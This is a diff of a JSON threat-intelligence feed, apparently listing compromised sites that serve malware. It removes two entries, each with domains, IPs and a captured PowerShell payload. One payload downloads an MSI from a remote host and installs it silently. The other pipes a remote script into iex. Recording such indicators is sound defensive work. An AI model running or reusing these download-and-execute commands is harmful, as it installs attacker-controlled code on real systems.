@@ -10429,43 +10429,5 @@
     ],
     "ReportId": "cmwh6rtfu0ot30omlftsxinhi",
     "ScannedAt": "2026-11-15T01:59:05.218000+00:00"
-  },
-  {
-    "UrlDomain": "ingenieriapyd.cl",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "201.148.104.90"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwh41jw00nhv0omlq5rsqtp4",
-    "ScannedAt": "2026-11-15T00:42:40.551000+00:00"
-  },
-  {
-    "UrlDomain": "www.ramcoadvanced.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/80b09b7fad57f0fd"
-    ],
-    "IP": [
-      "192.254.225.159"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/80b09b7fad57f0fd')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/80b09b7fad57f0fd"
-    ],
-    "ReportId": "cmwh41hiz0nhk0oml3qlpmmlm",
-    "ScannedAt": "2026-11-15T00:42:37.489000+00:00"
   }
 ]
